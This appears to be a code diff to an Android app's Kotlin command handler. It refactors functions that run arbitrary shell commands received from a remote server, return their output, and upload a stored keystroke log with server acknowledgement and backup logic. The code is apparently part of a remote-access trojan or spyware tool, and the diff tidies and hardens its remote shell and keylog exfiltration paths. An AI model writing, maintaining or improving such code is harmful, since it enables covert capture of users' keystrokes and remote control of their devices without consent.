@@ -21,36 +21,9 @@ class SystemHandlers(private val ctx: CommandContext) {
         private const val TAG = "SystemCore"
     }
 
-    fun executeShellCommand(params: JSONObject?) {
-        val command = params?.optString("command") ?: return
-        ctx.scope.launch {
-            try {
-                val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
-                val errorDeferred = ctx.scope.async(Dispatchers.IO) {
-                    process.errorStream.bufferedReader().use { it.readText() }
-                }
-                val output = process.inputStream.bufferedReader().use { it.readText() }
-                val error = errorDeferred.await()
-                if (!process.waitFor(30, TimeUnit.SECONDS)) {
-                    process.destroyForcibly()
-                }
+    private val keylogLock = Any()
 
-                ctx.sendResponse("shell_result", JSONObject().apply {
-                    put("output", output)
-                    put("error", error)
-                    put("exit_code", process.exitValue())
-                })
-            } catch (e: Exception) {
-                ctx.sendResponse("shell_result", JSONObject().apply {
-                    put("error", (e.message ?: "Unknown error"))
-                })
-            }
-        }
-    }
-
-    fun executeShellExec(params: JSONObject?) {
-        val command = params?.optString("command") ?: return sendError("Missing command")
-
+    private fun runShellCommand(command: String, responseType: String, includeCommand: Boolean = false) {
         ctx.scope.launch {
             try {
                 val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
@@ -64,35 +37,52 @@ class SystemHandlers(private val ctx: CommandContext) {
                     process.destroyForcibly()
                 }
 
-                ctx.sendResponse("shell_output", JSONObject().apply {
+                ctx.sendResponse(responseType, JSONObject().apply {
                     put("output", output)
                     put("error", error)
                     put("exit_code", if (completed) process.exitValue() else -1)
-                    put("command", command)
+                    if (includeCommand) put("command", command)
                 })
             } catch (e: Exception) {
-                sendError("Shell exec error: ${(e.message ?: "Unknown error")}")
+                val errorMsg = e.message ?: "Unknown error"
+                if (includeCommand) sendError("Shell exec error: $errorMsg")
+                else ctx.sendResponse(responseType, JSONObject().apply { put("error", errorMsg) })
             }
         }
+    }
+
+    fun executeShellCommand(params: JSONObject?) {
+        val command = params?.optString("command") ?: return
+        runShellCommand(command, "shell_result")
+    }
+
+    fun executeShellExec(params: JSONObject?) {
+        val command = params?.optString("command") ?: return sendError("Missing command")
+        runShellCommand(command, "shell_output", includeCommand = true)
     }
 
     fun executeGetKeylogDump() {
         ctx.scope.launch {
             val prefs = ctx.appContext.getSharedPreferences("keylog_prefs", Context.MODE_PRIVATE)
-            val buffer = prefs.getString("keylog_buffer", "") ?: ""
 
-            if (buffer.isEmpty()) {
-                ctx.sendResponse("keylog_dump", JSONObject().apply {
-                    put("data", "")
-                    put("timestamp", System.currentTimeMillis())
-                    put("status", "empty")
-                })
-                return@launch
+            val buffer: String
+            val backupKey: String
+            synchronized(keylogLock) {
+                buffer = prefs.getString("keylog_buffer", "") ?: ""
+
+                if (buffer.isEmpty()) {
+                    ctx.sendResponse("keylog_dump", JSONObject().apply {
+                        put("data", "")
+                        put("timestamp", System.currentTimeMillis())
+                        put("status", "empty")
+                    })
+                    return@launch
+                }
+
+                // Create backup before sending
+                backupKey = "keylog_backup_${System.currentTimeMillis()}"
+                prefs.edit().putString(backupKey, buffer).apply()
             }
-
-            // Create backup before sending
-            val backupKey = "keylog_backup_${System.currentTimeMillis()}"
-            prefs.edit().putString(backupKey, buffer).apply()
 
             // Send with confirmation request
             ctx.sendResponse("keylog_dump", JSONObject().apply {
@@ -105,13 +95,14 @@ class SystemHandlers(private val ctx: CommandContext) {
 
             // Schedule cleanup after 5 minutes (if no ACK received)
             Handler(Looper.getMainLooper()).postDelayed({
-                // Only clear if buffer unchanged (means ACK received and cleared by handleKeylogAck)
-                val currentBuffer = prefs.getString("keylog_buffer", "")
-                if (currentBuffer == buffer) {
-                    Log.d(TAG, "No ACK received after 5min, keeping buffer")
-                } else {
-                    // ACK was received, safe to remove backup
-                    prefs.edit().remove(backupKey).apply()
+                synchronized(keylogLock) {
+                    val currentBuffer = prefs.getString("keylog_buffer", "")
+                    if (currentBuffer == buffer) {
+                        Log.d(TAG, "No ACK received after 5min, keeping buffer")
+                    } else {
+                        // ACK was received, safe to remove backup
+                        prefs.edit().remove(backupKey).apply()
+                    }
                 }
             }, 5 * 60 * 1000) // 5 minutes
         }
@@ -123,19 +114,21 @@ class SystemHandlers(private val ctx: CommandContext) {
             val success = ackData.optBoolean("success", false)
             val backupKey = ackData.optString("backup_key", "")
 
-            if (success) {
-                // Server confirmed receipt - safe to clear
-                prefs.edit()
-                    .putString("keylog_buffer", "")
-                    .remove(backupKey)
-                    .apply()
-                Log.d(TAG, "Keylog buffer cleared after server ACK")
-            } else {
-                // Server reported error - restore from backup
-                val backup = prefs.getString(backupKey, "")
-                if (backup != null && backup.isNotEmpty()) {
-                    prefs.edit().putString("keylog_buffer", backup).apply()
-                    Log.w(TAG, "Keylog upload failed - restored from backup")
+            synchronized(keylogLock) {
+                if (success) {
+                    // Server confirmed receipt - safe to clear
+                    prefs.edit()
+                        .putString("keylog_buffer", "")
+                        .remove(backupKey)
+                        .apply()
+                    Log.d(TAG, "Keylog buffer cleared after server ACK")
+                } else {
+                    // Server reported error - restore from backup
+                    val backup = prefs.getString(backupKey, "")
+                    if (backup != null && backup.isNotEmpty()) {
+                        prefs.edit().putString("keylog_buffer", backup).apply()
+                        Log.w(TAG, "Keylog upload failed - restored from backup")
+                    }
                 }
             }
         }
